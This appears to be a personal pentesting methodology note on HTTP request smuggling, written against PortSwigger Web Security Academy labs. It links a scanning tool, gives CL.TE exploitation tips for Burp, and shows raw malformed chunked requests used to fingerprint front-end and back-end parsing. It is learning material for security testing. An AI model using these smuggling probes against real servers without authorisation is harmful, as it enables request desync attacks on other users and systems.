### Use this tool to check for http request smuggling vulnerabilities
`https://github.com/defparam/smuggler`


### Things to keep in mind to successfully exploit http request smuggling attacks.
```
1. Make sure to use HTTP/1.1 before trying to exploit because HTTP/2 doesn't support that.
In the inspector tab in burp , change to HTTP/1.1 from request attributes

2. If you are trying to using CL.TE , make sure you include connection: keep-alive header,
cause the backend server will only include that smuggled part in next request over same connection and
 using connection: keep-alive header will keep connection over same network.
3. In transfer encoding, 0 should be followed by new line
   0\r\n
   \r\n
```
### Identify if the frontend is using TE
send the request with  invalid transfer encoding request and see if it respond with bad request. If the response is invalid or bad request then the frontend is rejecting the invalid TE request. So, it confirms TE in frontend
```
POST / HTTP/1.1
Host: 0a9800ec040696b6826d248900930006.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked

3
abc
x

```
response comes back as
```
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Content-Type-Options: nosniff
Connection: close
Content-Length: 27

{"error":"Invalid request"}
```
---
### Identifying if backend is using CE
send the below request and see the server timeout response from the server
```
POST / HTTP/1.1
Host: 0a9800ec040696b6826d248900930006.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 6
Transfer-Encoding: chunked

0

x
```
![Screenshot from 2023-10-31 18-22-58](https://github.com/Sameer484/methodology/assets/110039044/0b867e3e-217f-48ef-b76f-96daea24ba74)

### use this picture to identify the type of frontend and backend

![Screenshot from 2023-10-31 18-18-35](https://github.com/Sameer484/methodology/assets/110039044/835c41e8-a5be-4975-a793-29abe1053668)
